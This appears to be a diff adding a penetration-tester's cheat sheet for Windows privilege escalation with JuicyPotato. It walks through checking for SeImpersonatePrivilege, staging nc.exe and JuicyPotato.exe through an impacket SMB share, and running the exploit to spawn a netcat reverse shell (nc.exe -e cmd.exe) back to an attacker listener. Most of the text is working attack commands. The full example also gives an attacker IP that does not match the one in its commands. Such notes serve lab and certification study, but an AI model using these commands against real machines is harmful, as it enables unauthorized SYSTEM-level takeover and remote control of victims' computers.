@@ -1,0 +1,56 @@
+# On your kali:
+sudo nc -lnvp 80
+
+# If you have rlwrap installed:
+sudo rlwrap nc -lnvp 80
+
+# On the target windows box. Assuming you are working out of c:\temp and nc.exe has been copied to the target
+c:\temp\JuicyPotato.exe  -t * -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe -e cmd.exe 10.10.1.2 80" -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}"
+
+### Full example:
+Kali IP: 10.11.12.13
+Victim: 20.21.23.24
+
+1) On the target box you notice that your user has the SeImpersonatePrivilege
+
+whoami /all
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+
+2) From your Kali machine, copy nc.exe and JuicyPotato.exe to the target. You can use any method you like. I am going with impacket-smbserver
+# Start the smbserver on the current directory
+sudo impacket-smbserver mystuff $(pwd)
+
+
+3) Start a listenner on your Kali
+sudo nc -lnvp 80
+
+
+4) Back on the target machine
+cd c:\
+mkdir Temp
+cd c:\Temp
+copy \\10.11.12.13\mystuff\nc.exe
+copy \\10.11.12.13\mystuff\JuicyPotato.exe
+
+
+5) Execute the JuicyPotato exploit
+c:\temp\JuicyPotato.exe  -t * -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe -e cmd.exe 10.10.1.2 80" 
+
+# If the exploit fails because of the CLSID, you can always pick a different one. Just make sure you select the correct OS
+http://ohpe.it/juicy-potato/CLSID
+
+# To use a different CLSID, use the -c  
+c:\temp\JuicyPotato.exe  -t * -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe -e cmd.exe 10.10.1.2 80" -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}"
